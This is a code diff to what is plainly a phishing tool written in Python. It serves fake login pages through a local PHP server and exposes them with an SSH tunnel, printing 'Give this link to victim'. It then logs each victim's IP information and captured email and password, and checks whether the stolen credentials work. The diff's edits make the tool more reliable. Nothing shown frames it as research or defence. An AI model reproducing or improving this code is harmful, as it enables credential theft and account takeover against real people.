@@ -91,10 +91,10 @@ def select_option():
 
 
 def server_path():
-    print("Select a server from below:")
+    print(_colored("Select a server from below:", "green"))
     print()
-    print(_colored("[1] SERVEO (RECOMMENDED)", "green"))
-    print(_colored("[2] CLOUDFLARE (URL BAN)", "green"))
+    print(_colored("[1] LOCALHOST.RUN (RECOMMENDED)", "green"))
+    print(_colored("[2] CLOUDFLARE (LINK GET'S BAN)", "green"))
     print()
     server_num = input(_colored("Enter a number: ", "green")).strip()
     if server_num in ['1', '01', 'a', 'A']:
@@ -112,15 +112,15 @@ def handle_verification(folder):
     veri_file = os.path.join(folder, 'veri.txt')
     ip_file = os.path.join(folder, 'ip.txt')
     
-    if os.path.exists(ip_file) and ip_tries == 0:
+    if os.path.exists(ip_file):
         with open(ip_file, 'r') as file:
             ip_info = file.read()
-            print(_colored("SOME ONE HAS CLICKED THE LINK!! INFO:", "red"),"\n")
-            print(_colored("══════════════", "green"))
+            print(_colored("\rSOME ONE HAS CLICKED THE LINK!! INFO:", "red"),"\n")
+            print(_colored("\r══════════════", "green"))
             print(ip_info)
-            print(_colored("══════════════", "green"))
+            print(_colored("\r══════════════", "green"))
         os.remove(ip_file)
-        ip_tries = 1
+        
     
     if os.path.exists(cred_file):
         email, password = None, None
@@ -135,19 +135,19 @@ def handle_verification(folder):
         if email and password:
             if not check_account(email, password):
             #                  ════════════════════════════ 
-                print("\033[31m════════════════════════════\033[0m")
-                print(f"\033[31mUSER: {email}\033[0m")
-                print(f"\033[31mPASS: {password}\033[0m")
-                print("\033[31m════════════════════════════\033[0m")
+                print("\r\033[31m════════════════════════════\033[0m")
+                print(f"\r\033[31mUSER: {email}\033[0m")
+                print(f"\r\033[31mPASS: {password}\033[0m")
+                print("\r\033[31m════════════════════════════\033[0m")
                 
                 with open(veri_file, 'w') as f:
                     f.write('verify=no')
             else:
-                print(_colored("════════════════════════════", "green"))
-                print(_colored(f"USER: {email}", "green"))
-                print(_colored(f"PASS: {password}", "green"))
-                print(_colored("════════════════════════════", "green"))
-                input("Press Enter to continue...")
+                print(_colored("\r════════════════════════════", "green"))
+                print(_colored(f"\rUSER: {email}", "green"))
+                print(_colored(f"\rPASS: {password}", "green"))
+                print(_colored("\r════════════════════════════", "green"))
+                input("\rPress Enter to continue...")
                 with open(veri_file, 'w') as f:
                     f.write('verify=true')
                 sys.exit(0)
@@ -156,25 +156,31 @@ def handle_verification(folder):
 def serveo():
     command = f"ssh -R 80:localhost:3333 localhost.run"
     
-    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
     localhost_run_url = None
 
     # Iterate over the output lines
     for line in process.stdout:
-        # Check if the line contains 'tunneled with tls termination,'
-        if "tunneled with tls termination," in line:
-            # Extract the URL part from the line
-            parts = line.strip().split(" ")
-            for part in parts:
-                if part.startswith("https://"):
-                    localhost_run_url = part
-                    break
-            if localhost_run_url:
-                break  # Stop after finding the correct URL
+        # Clean up the line to remove unwanted characters
+        line = line.strip().replace('\r', '')
 
-    # Return the URL and the process handle
-    print(_colored(f"Give this link to victim: {localhost_run_url}", "green"))
+        # Check if the line contains 'https://' and 'lhr.life'
+        if "https://" in line and "lhr.life" in line:
+            # Extract the part that starts with https:// and ends with lhr.life
+            start = line.find("https://")
+            end = line.find("lhr.life") + len("lhr.life")  # Include 'lhr.life'
+            localhost_run_url = line[start:end]
+            break
+
+    # Print the link with proper formatting and flushing
+    if localhost_run_url:
+        print("\n")
+        print(_colored(f"Give this link to victim: {localhost_run_url}", "green"), flush=True)
+    else:
+        print(_colored("Error: Unable to retrieve the Serveo URL.", "red"))
 def php_server(directory, port=3333):
+    print()
+    print(_colored("Starting PHP server ...", "green"))
     php_command = ["php", "-S", f"localhost:{port}", "-t", directory]
     php_server = subprocess.Popen(php_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
     time.sleep(2)  # Wait a moment to ensure the server has started
@@ -200,9 +206,9 @@ def main():
     srv_num = server_path()
     
     if path == 1:
-        php_server = php_server("normal/", port=3333)
+        php_server1 = php_server("normal/", port=3333)
     elif path == 2:
-        php_server = php_server("security/", port=3333)
+        php_server1 = php_server("security/", port=3333)
     
     if srv_num == 1:
         serveo()
